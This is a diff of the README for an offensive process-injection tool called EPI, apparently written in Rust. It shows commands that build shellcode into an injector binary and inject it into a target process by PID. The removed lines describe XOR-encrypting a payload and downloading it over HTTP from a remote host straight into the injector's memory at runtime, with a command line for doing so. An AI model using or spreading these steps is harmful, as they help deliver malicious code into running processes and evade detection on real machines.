@@ -43,14 +43,6 @@ If you just want to directly execute your custom shellcode without using the Loa
 	C:\Users\User\Desktop\EPI> python3 builder.py -p c:\path\to\payload.bin
 	C:\Users\User\Desktop\EPI\EPI\target\release> epi.exe -h 
 
-In case you don't want to embed the payload in the resulting binary, you can encrypt it (simple xor encryption) using the `-d` flag and then download it directly into the injector's process memory using HTTP:
-
-	C:\Users\User\Desktop\EPI> python3 builder.py -p c:\path\to\payload.bin -d
-
-The resulting encrypted payload will be written to the `payload` directory. The encryption key will be the same value used for the `LITCRYPT_ENCRYPT_KEY` environment variable. You have to pass this value to `epi.exe` to be able to decrypt the payload in runtime:
-
-	C:\Users\User\Desktop\EPI\EPI\target\release> epi.exe -p <PID> -u http://remoteip/payload.bin -k setarandomkeyeachtime [flags]
-
 Be aware that, depending on the behaviour of your shellcode, you might end up hijacking the thread and potentially causing a process crash. Also, take into account that no cleanup will be performed when injecting this way, leading to all kind of unexpected process behaviours.
 
 ## Loader & Custom payload
